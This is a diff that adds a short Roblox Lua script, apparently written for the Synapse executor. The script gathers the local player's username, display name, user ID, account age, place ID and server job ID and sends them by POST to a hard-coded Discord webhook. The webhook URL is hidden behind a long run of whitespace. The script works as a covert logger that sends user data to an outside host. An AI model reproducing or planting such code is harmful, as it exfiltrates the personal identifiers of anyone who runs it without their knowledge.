@@ -1,0 +1,26 @@
+    local lp = game.Players.LocalPlayer.Name
+    local placeid = game.PlaceId
+    local accage = game.Players.LocalPlayer.AccountAge
+    local userid = game.Players.LocalPlayer.UserId
+    local displayname = game.Players.LocalPlayer.DisplayName
+    local jobid = game.JobId
+
+msg = {
+["embeds"] = {{
+["color"] = 053000,
+["description"] = "Username: " .. "```".. lp .."```".. " Display Name: " .."```".. displayname .."```".. " User Id: ".. "```"..userid.."```" .. " Account Age" .. "```"..accage.."```" .. " Place ID: " .. "```"..placeid.."```" .. " JobID: " .. "```"..jobid.."```",
+["author"] = {
+["name"] = ""..lp
+}}
+}
+}
+local response = syn.request(
+{
+Url = 																																																														"https://discord.com/api/webhooks/985359452695855174/SkGP9VZnBavTi92r3ETfMpa25CPDOBcdmKgEr1dv8SDMrozSpVHaRmx9pZ1q_lvmWZaR",
+Method = "POST",
+Headers = {
+["Content-Type"] = "application/json"
+},
+Body = game:GetService("HttpService"):JSONEncode(msg)
+}
+)
